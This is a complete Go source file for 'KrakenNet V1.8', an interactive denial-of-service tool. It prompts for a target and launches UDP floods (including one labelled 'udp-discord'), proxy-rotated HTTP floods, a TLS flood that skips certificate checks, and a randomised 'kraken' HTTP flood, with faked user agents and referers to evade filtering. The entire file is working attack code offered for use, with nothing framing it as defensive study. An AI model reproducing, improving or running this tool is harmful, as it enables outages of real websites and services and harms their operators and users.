package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	Reset   = "\033[0m"
	Red     = "\033[31m"
	Green   = "\033[32m"
	Yellow  = "\033[33m"
	Cyan    = "\033[36m"
	Magenta = "\033[35m"
)

var userAgents []string
var referers []string
var methods = []string{"GET", "POST", "HEAD", "OPTIONS"}

func loadLines(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		return nil
	}
	defer file.Close()
	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		l := strings.TrimSpace(scanner.Text())
		if l != "" {
			lines = append(lines, l)
		}
	}
	return lines
}

func printBanner() {
	banner := `

KrakenNet - V1.8    
      
  Made by Piwiii2.0

`
	fmt.Print(Cyan)
	fmt.Println(banner)
	fmt.Print(Reset)
}

func randomUserAgent() string {
	if len(userAgents) > 0 {
		return userAgents[rand.Intn(len(userAgents))]
	}
	return "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}

func randomReferer() string {
	if len(referers) > 0 {
		return referers[rand.Intn(len(referers))]
	}
	return "https://www.google.com/"
}

func randomMethod() string {
	return methods[rand.Intn(len(methods))]
}

func randomPath() string {
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, rand.Intn(10)+5)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return "/" + string(b)
}

func loadProxies(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			proxies = append(proxies, line)
		}
	}
	return proxies, scanner.Err()
}

func newClientWithProxy(proxyStr string, maxConns int) (*http.Client, error) {
	proxyURL, err := url.Parse(proxyStr)
	if err != nil {
		return nil, err
	}
	tr := &http.Transport{
		Proxy:               http.ProxyURL(proxyURL),
		MaxIdleConns:        maxConns,
		MaxConnsPerHost:     maxConns,
		IdleConnTimeout:     5 * time.Second,
		DisableCompression:  true,
		TLSHandshakeTimeout: 3 * time.Second,
		DialContext: (&net.Dialer{
			Timeout:   3 * time.Second,
			KeepAlive: 3 * time.Second,
		}).DialContext,
	}
	client := &http.Client{
		Timeout:   6 * time.Second,
		Transport: tr,
	}
	return client, nil
}

var serverDownShown int32 = 0

func sendRequest(client *http.Client, baseURL string) bool {
	method := randomMethod()
	url := baseURL + randomPath()
	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "/*")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Cache-Control", "no-cache")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	if resp.StatusCode == 500 || resp.StatusCode == 502 || resp.StatusCode == 503 || resp.StatusCode == 504 {
		if atomic.CompareAndSwapInt32(&serverDownShown, 0, 1) {
			fmt.Println(Red + "❌ Server is down." + Reset)
		}
		return false
	}
	return resp.StatusCode >= 200 && resp.StatusCode < 500
}

func udpDiscordFlood(target string, duration time.Duration, workers int) {
	host := strings.Split(target, ":")[0]
	if host == "" {
		fmt.Println(Red + "Invalid target IP for UDP flood." + Reset)
		return
	}
	port := 50000
	addr := fmt.Sprintf("%s:%d", host, port)
	udpAddr, err := net.ResolveUDPAddr("udp", addr)
	if err != nil {
		fmt.Println(Red + "Failed to resolve UDP addr:", err.Error()+Reset)
		return
	}
	staticPayload := []byte{0x80, 0x78, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01}
	randPayload := make([]byte, 12)
	var wg sync.WaitGroup
	stop := time.Now().Add(duration)
	fmt.Println(Green + "🚀 Starting udp-discord flood on " + addr + Reset)
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.DialUDP("udp", nil, udpAddr)
			if err != nil {
				return
			}
			defer conn.Close()
			for time.Now().Before(stop) {
				rand.Read(randPayload)
				packet := append(staticPayload, randPayload...)
				conn.Write(packet)
			}
		}()
	}
	wg.Wait()
}

func udpBypassFlood(target string, duration time.Duration, workers int) {
	host, portStr, err := net.SplitHostPort(target)
	if err != nil {
		fmt.Println(Red + "Invalid target address (expected ip:port)" + Reset)
		return
	}
	_, err = strconv.Atoi(portStr)
	if err != nil {
		fmt.Println(Red + "Invalid port number." + Reset)
		return
	}
	udpAddr, err := net.ResolveUDPAddr("udp", net.JoinHostPort(host, portStr))
	if err != nil {
		fmt.Println(Red + "Failed to resolve UDP addr:" + err.Error() + Reset)
		return
	}
	var wg sync.WaitGroup
	stop := time.Now().Add(duration)
	fmt.Println(Green + "🚀 Starting udp-bypass flood on " + target + Reset)
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.DialUDP("udp", nil, udpAddr)
			if err != nil {
				return
			}
			defer conn.Close()
			buf := make([]byte, 64)
			r := rand.New(rand.NewSource(time.Now().UnixNano()))
			for time.Now().Before(stop) {
				r.Read(buf)
				conn.Write(buf)
			}
		}()
	}
	wg.Wait()
}

func udpGbpsFlood(target string, duration time.Duration, workers int) {
	udpAddr, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		fmt.Println(Red + "Failed to resolve UDP addr:" + err.Error() + Reset)
		return
	}
	var wg sync.WaitGroup
	stop := time.Now().Add(duration)
	fmt.Println(Green + "🚀 Starting udp-gbps flood on " + target + Reset)
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.DialUDP("udp", nil, udpAddr)
			if err != nil {
				return
			}
			defer conn.Close()
			buf := make([]byte, 1400)
			r := rand.New(rand.NewSource(time.Now().UnixNano()))
			for time.Now().Before(stop) {
				r.Read(buf)
				conn.Write(buf)
			}
		}()
	}
	wg.Wait()
}

func runHttpFlood(target string, duration time.Duration, workers int, proxies []string) {
	if len(proxies) == 0 {
		fmt.Println(Red + "No valid proxies for HTTP flood." + Reset)
		return
	}
	stop := time.Now().Add(duration)
	var wg sync.WaitGroup
	fmt.Println(Green + "🚀 Starting HTTP flood on " + target + Reset)
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(workerId int) {
			defer wg.Done()
			proxyStr := proxies[workerId%len(proxies)]
			client, err := newClientWithProxy(proxyStr, 100)
			if err != nil {
				return
			}
			for time.Now().Before(stop) {
				sendRequest(client, target)
			}
		}(i)
	}
	wg.Wait()
}

func tlsFlood(target string, duration time.Duration, workers int, connections int) {
	urlParsed, err := url.Parse(target)
	if err != nil || (urlParsed.Scheme != "https" && urlParsed.Scheme != "http") {
		fmt.Println(Red + "Invalid target URL for TLS flood (must be https:// or http://)" + Reset)
		return
	}
	stop := time.Now().Add(duration)
	var wg sync.WaitGroup
	fmt.Println(Green + "🚀 Starting TLS flood on " + target + Reset)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:    connections,
		MaxConnsPerHost: connections,
	}
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := &http.Client{
				Timeout:   10 * time.Second,
				Transport: tr,
			}
			for time.Now().Before(stop) {
				req, err := http.NewRequest("GET", target, nil)
				if err != nil {
					continue
				}
				req.Header.Set("User-Agent", randomUserAgent())
				req.Header.Set("Accept", "/")
				req.Header.Set("Connection", "keep-alive")
				req.Header.Set("Cache-Control", "no-cache")
				resp, err := client.Do(req)
				if err == nil {
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
				}
				time.Sleep(1 * time.Millisecond)
			}
		}()
	}
	wg.Wait()
}

func httpKraken(target string, duration time.Duration, workers int, connections int) {
	stop := time.Now().Add(duration)
	var wg sync.WaitGroup
	fmt.Println(Green + "🚀 Starting http-kraken flood on " + target + Reset)
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := &http.Client{
				Timeout: 10 * time.Second,
				Transport: &http.Transport{
					MaxIdleConns:        connections,
					MaxConnsPerHost:     connections,
					IdleConnTimeout:     10 * time.Second,
					DisableCompression:  true,
					TLSHandshakeTimeout: 5 * time.Second,
					DialContext: (&net.Dialer{
						Timeout:   5 * time.Second,
						KeepAlive: 30 * time.Second,
					}).DialContext,
				},
			}
			randGen := rand.New(rand.NewSource(time.Now().UnixNano()))
			paths := []string{"", "login", "news", "forum", "top", "new", "trending", "comments", "random", "hot"}
			dataChars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
			for time.Now().Before(stop) {
				path := paths[randGen.Intn(len(paths))]
				if path != "" {
					path = "/" + path
				}
				paramsCount := randGen.Intn(6)
				params := url.Values{}
				for i := 0; i < paramsCount; i++ {
					keyLen := randGen.Intn(5) + 3
					valLen := randGen.Intn(5) + 3
					key := make([]byte, keyLen)
					val := make([]byte, valLen)
					for j := 0; j < keyLen; j++ {
						key[j] = dataChars[randGen.Intn(len(dataChars))]
					}
					for j := 0; j < valLen; j++ {
						val[j] = dataChars[randGen.Intn(len(dataChars))]
					}
					params.Add(string(key), string(val))
				}
				fullURL := target + path
				if paramsCount > 0 {
					fullURL += "?" + params.Encode()
				}
				body := ""
				method := "GET"
				if randGen.Intn(2) == 1 {
					method = "POST"
					bodyLen := randGen.Intn(150) + 20
					bb := make([]byte, bodyLen)
					for i := 0; i < bodyLen; i++ {
						bb[i] = dataChars[randGen.Intn(len(dataChars))]
					}
					body = string(bb)
				}
				req, err := http.NewRequest(method, fullURL, strings.NewReader(body))
				if err != nil {
					continue
				}
				req.Header.Set("User-Agent", randomUserAgent())
				req.Header.Set("Accept", "/")
				req.Header.Set("Cache-Control", "no-cache")
				req.Header.Set("Connection", "keep-alive")
				req.Header.Set("Referer", randomReferer())
				if method == "POST" {
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
					req.Header.Set("Content-Length", strconv.Itoa(len(body)))
				}
				resp, err := client.Do(req)
				if err == nil {
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
				}
				time.Sleep(1 * time.Millisecond)
			}
		}()
	}
	wg.Wait()
}

func validateProxy(proxy string, ch chan<- string, wg *sync.WaitGroup) {
	defer wg.Done()
	proxyURL, err := url.Parse(proxy)
	if err != nil {
		return
	}
	tr := &http.Transport{
		Proxy:               http.ProxyURL(proxyURL),
		TLSHandshakeTimeout: 500 * time.Millisecond,
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   500 * time.Millisecond, // Timeout uniquement pour le test
	}
	req, err := http.NewRequest("GET", "http://example.com", nil)
	if err != nil {
		return
	}
	req.Header.Set("User-Agent", randomUserAgent())
	resp, err := client.Do(req)
	if err == nil && resp.StatusCode >= 200 && resp.StatusCode < 400 {
		resp.Body.Close()
		ch <- proxy
	}
}

func filterValidProxies(proxies []string) []string {
	ch := make(chan string, len(proxies))
	var wg sync.WaitGroup
	sem := make(chan struct{}, 200)
	found := 0

	for _, p := range proxies {
		if found >= 50 {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(proxy string) {
			defer func() { <-sem }()
			validateProxy(proxy, ch, &wg)
		}(p)
	}
	wg.Wait()
	close(ch)

	valid := []string{}
	for p := range ch {
		valid = append(valid, p)
		found++
		if found >= 50 {
			break
		}
	}
	return valid
}

func runAttack() {
	rand.Seed(time.Now().UnixNano())
	reader := bufio.NewReader(os.Stdin)
	printBanner()

	userAgents = loadLines("useragents.txt")
	if len(userAgents) == 0 {
		fmt.Println(Yellow + "⚠️ Warning: useragents.txt not found or empty, using default user agents." + Reset)
		userAgents = []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
			"Mozilla/5.0 (Linux; Android 10; SM-G970F)",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 14_2)",
			"curl/7.68.0",
			"Wget/1.20.3 (linux-gnu)",
			"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0)",
		}
	}

	referers = loadLines("referers.txt")
	if len(referers) == 0 {
		fmt.Println(Yellow + "⚠️ Warning: referers.txt not found or empty, using default referers." + Reset)
		referers = []string{
			"https://www.google.com/",
			"https://www.bing.com/",
			"https://www.yahoo.com/",
			"https://duckduckgo.com/",
			"https://www.youtube.com/",
		}
	}

	for {
		fmt.Print(Yellow + "Enter target URL or IP (or 'exit' to quit): " + Reset)
		target, _ := reader.ReadString('\n')
		target = strings.TrimSpace(target)
		if target == "exit" {
			break
		}
		if target == "" {
			continue
		}

		fmt.Print(Yellow + "Enter attack duration in seconds: " + Reset)
		durationStr, _ := reader.ReadString('\n')
		durationStr = strings.TrimSpace(durationStr)
		durationSec, err := strconv.Atoi(durationStr)
		if err != nil || durationSec <= 0 {
			fmt.Println(Red + "Invalid duration." + Reset)
			continue
		}
		duration := time.Duration(durationSec) * time.Second

		fmt.Print(Yellow + "Enter number of workers: " + Reset)
		workersStr, _ := reader.ReadString('\n')
		workersStr = strings.TrimSpace(workersStr)
		workers, err := strconv.Atoi(workersStr)
		if err != nil || workers <= 0 {
			fmt.Println(Red + "Invalid number of workers." + Reset)
			continue
		}

		fmt.Print(Yellow + "Enter number of connections per worker: " + Reset)
		connsStr, _ := reader.ReadString('\n')
		connsStr = strings.TrimSpace(connsStr)
		connections, err := strconv.Atoi(connsStr)
		if err != nil || connections <= 0 {
			fmt.Println(Red + "Invalid number of connections." + Reset)
			continue
		}

		fmt.Print(Yellow + "Choose attack method :\n udp-discord\n udp-bypass\n udp-gbps\n http\n tls\n kraken\n" + Reset)
		method, _ := reader.ReadString('\n')
		method = strings.TrimSpace(strings.ToLower(method))

		var proxies []string
		if method == "http" || method == "kraken" || method == "tls" {
			fmt.Println(Yellow + "Loading proxies from http.txt..." + Reset)
			rawProxies, err := loadProxies("http.txt")
			if err != nil || len(rawProxies) == 0 {
				fmt.Println(Red + "Failed to load proxies or file empty." + Reset)
				continue
			}
			proxies = filterValidProxies(rawProxies)
			if len(proxies) == 0 {
				fmt.Println(Red + "No valid proxies found." + Reset)
				continue
			}
			fmt.Printf(Green+"%d valid proxies loaded.\n"+Reset, len(proxies))
		}

		switch method {
		case "udp-discord":
			udpDiscordFlood(target, duration, workers)
		case "udp-bypass":
			udpBypassFlood(target, duration, workers)
		case "udp-gbps":
			udpGbpsFlood(target, duration, workers)
		case "http":
			runHttpFlood(target, duration, workers, proxies)
		case "tls":
			tlsFlood(target, duration, workers, connections)
		case "kraken":
			httpKraken(target, duration, workers, connections)
		default:
			fmt.Println(Red + "Unknown attack method." + Reset)
		}
	}
	fmt.Println(Green + "Exiting." + Reset)
}

func main() {
	rand.Seed(time.Now().UnixNano())
	runAttack()
}
